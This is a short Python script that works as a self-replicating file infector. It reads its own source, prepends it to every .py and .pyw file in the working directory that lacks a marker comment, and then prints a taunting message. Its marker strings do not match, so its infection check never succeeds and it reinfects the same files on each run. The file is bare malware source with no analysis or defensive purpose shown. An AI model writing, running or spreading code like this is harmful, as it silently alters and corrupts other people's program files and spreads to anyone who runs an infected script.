import sys
import glob

def read_file(file):
    with open(file, 'r') as f:
        return f.readlines()

def write_file(file, content):
    with open(file, 'w') as f:
        f.writelines(content)

def is_tested(file_code):
    return any(line.strip() == '# FUN SAYS HI!' for line in file_code)

def get_fun_code():
    lines = read_file(sys.argv[0])
    fun_code = []
    self_replicating_part = False
    for line in lines:
        if line.strip() == '# Fun says HI!':
            self_replicating_part = True
        if not self_replicating_part:
            fun_code.append(line)
        if line.strip() == '# FUN SAYS BYE!':
            break
    return fun_code

def replicate_code(fun_code):
    python_files = glob.glob('*.py') + glob.glob('*.pyw')
    for file in python_files:
        file_code = read_file(file)
        if not is_tested(file_code):
            final_code = fun_code + ['\n'] + file_code
            write_file(file, final_code)

def cool_code():
    print('YOU HAVE BEEN made fun of HAHAHA !!!')

fun_code = get_fun_code()
replicate_code(fun_code)
cool_code()
